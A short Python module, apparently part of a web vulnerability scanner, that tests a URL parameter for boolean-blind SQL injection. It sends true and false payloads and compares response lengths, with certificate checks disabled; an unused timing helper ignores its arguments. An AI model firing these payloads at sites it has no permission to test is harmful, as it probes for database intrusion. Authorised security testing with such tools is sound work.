import requests, time, math
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

TRUE_PAYLOAD = "1' AND 1=1-- -"
FALSE_PAYLOAD = "1' AND 1=2-- -"

def _mutate(url: str, param: str, payload: str) -> str:
    p = urlparse(url)
    qs = parse_qs(p.query)
    qs[param] = payload
    return urlunparse(p._replace(query=urlencode(qs, doseq=True)))

def _time(url, payload, headers, timeout):
    start = time.perf_counter()
    requests.get(url, headers=headers, timeout=timeout, verify=False)
    return time.perf_counter() - start

def test(url: str, parameter: str, headers=None, timeout=8.0):
    t1 = _mutate(url, parameter, TRUE_PAYLOAD)
    t2 = _mutate(url, parameter, FALSE_PAYLOAD)
    try:
        len_true = len(requests.get(t1, headers=headers, timeout=timeout, verify=False).text)
        len_false = len(requests.get(t2, headers=headers, timeout=timeout, verify=False).text)
        vulnerable = abs(len_true - len_false) > 20
    except Exception:
        vulnerable = False
    return {
        "url": url,
        "technique": "Boolean‑blind",
        "parameter": parameter,
        "payload": TRUE_PAYLOAD,
        "vulnerable": vulnerable,
        "severity": "Medium" if vulnerable else "None",
    }
